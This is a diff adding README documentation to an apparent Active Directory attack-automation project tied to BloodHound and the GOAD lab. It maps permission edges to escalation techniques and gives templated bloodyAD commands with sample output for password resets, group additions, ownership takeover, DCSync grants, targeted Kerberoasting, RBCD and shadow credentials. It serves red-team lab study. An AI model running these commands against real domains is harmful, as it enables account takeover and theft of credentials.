@@ -193,6 +193,135 @@ Note: if your password contains special characters like `@@`, always wrap it in 
 
 > `vagrant` is a local machine account — it will not appear as a domain user in BloodHound. Domain users are AD principals like `JOFFREY.BARATHEON@SEVENKINGDOMS.LOCAL`.
 
+## All Techniques Mapped to Edge Kinds
+| Edge Kind               |   → Technique(s)                           |
+|-------------------------|--------------------------------------------|
+| AddMember               | → AddMember
+| ForceChangePassword     | → ForceChangePassword
+| GenericWrite (User)     | → TargetedKerberoast / ShadowCredentials
+| GenericWrite (Group)    | → AddMember
+| GenericWrite (Computer) | → RBCD
+| GenericAll  (User)      | → ForceChangePassword
+| GenericAll  (Group)     | → AddMember
+| GenericAll  (Computer)  | → RBCD
+| GenericAll  (Domain)    | → DCSync via WriteDACL
+| WriteDacl   (User)      | → GrantGenericAll → then ForceChangePassword
+| WriteDacl   (Group)     | → GrantGenericAll → then AddMember
+| WriteDacl   (Domain)    | → GrantDCSync → then DCSync
+| WriteOwner              | → TakeOwnership → then WriteDACL chain
+| Owns                    | → same as WriteOwner
+| DCSync                  | → DumpNTDS (secretsdump)
+| GetChanges + GetChangesAll | → DCSync |
+| Kerberoastable        | → Kerberoast (GetSPN + hashcat) |
+| AllowedToDelegate     | → S4U2Proxy impersonation |
+| AllowedToAct (RBCD)   | → S4U2Self + S4U2Proxy |
+| CoerceToTGT           | → Coercion + relay (responder/ntlmrelayx) |
+| ReadLAPSPassword      | → Read LAPS → get local admin creds |
+| CanRDPTo              | → RDP session |
+| CanPSRemoteTo         | → WinRM / PSRemoting session |
+| AdminTo               | → WMI / PSExec / SMB exec |
+
+Let us group them by category :
+```
+strategies/
+├── techniques/
+│   ├── __init__.py              ← exports everything
+│   ├── ldap_techniques.py       ← bloodyAD LDAP writes
+│   ├── kerberos_techniques.py   ← kerberoast, delegation, S4U
+│   ├── credential_techniques.py ← dcsync, laps, secretsdump
+│   └── exec_techniques.py       ← rdp, psremote, wmi, psexec
+```
+
+## ldap Techniques
+
+### Mapping
+
+| BloodHound Edge	| bloodyAD Technique | Target Type |
+|-----------------|--------------------|-------------|
+| ForceChangePassword |	_do_force_change_password	| User |
+| AddMember, GenericAll→Group, GenericWrite→Group |	_do_add_member |	Group |
+| WriteOwner, Owns	|_do_take_ownership	|Base |
+| WriteDacl, GenericAll→Domain	| _do_grant_dcsync |	Domain |
+| AddKeyCredentialLink, GenericAll→User/Computer | _do_shadow_credentials	| User/Computer |
+| WriteSPN, GenericAll→User, GenericWrite→User |	_do_targeted_kerberoast	| User |
+| WriteAccountRestrictions, GenericAll→Computer |	_do_rbcd |	Computer |
+
+### Each Command
+1. ForceChangePassword
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  set password <victim_SAM> <'NewPassword'>
+```
+  - Output:
+``` Output
+[+] Password changed successfully!
+```
+2. AddMember
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  add groupMember <target_group> <attacker_Sam>
+```
+  - Output:
+``` Output
+[+] attacker_Sam added to target_groups
+```
+3. TakeOwnership
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_SAM> -p <Hash NTLM or password> \
+  set owner <victim> <attacker_Sam>
+```
+  - Output:
+``` Output
+[+] Old owner S-1-5-21-... is now replaced by attacker_Sam on victim
+```
+4. GrantDCSync (WriteDacl on Domain)
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  add dcsync <attacker_Sam>
+```
+  - Output:
+``` Output
+[+] attacker_Sam has now dcsync rights on domain.local
+```
+5. TargetedKerberoast
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  add object <target_Sam> <servicePrincipalName> \
+  -v "fake/roast.domain.local"
+```
+  - Output:
+``` Output
+[+] target_Sam's servicePrincipalName has been updated
+```
+6. RBCD
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  add rbcd <'DOMAIN$'> <'ATTACKERPC$'>
+```
+  - Output:
+``` Output
+[+] Delegation rights modified successfully!
+ATTACKERPC$ can now impersonate users on DOMAIN$
+```
+7. ShadowCredentials
+``` Bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_Sam> -p <Hash NTLM or password> \
+  add shadowCredentials <victim_Sam>
+```
+  - Output:
+``` Output
+[+] KeyCredential generated with following sha256 of RSA key: 71c9...
+[+] TGT stored in ccache file victim_Sam_WS.ccache
+NT: 9029cf007326107eb1c519c84ea60dbe
+```
+
 ---
 
 ## References
@@ -200,3 +329,4 @@ Note: if your password contains special characters like `@@`, always wrap it in 
 - [BloodHound CE Docs](https://support.bloodhoundenterprise.io/)
 - [GOAD - Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
 - [BloodHound API Spec](http://localhost:8080/api/v2/spec) (local, requires running instance)
+- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
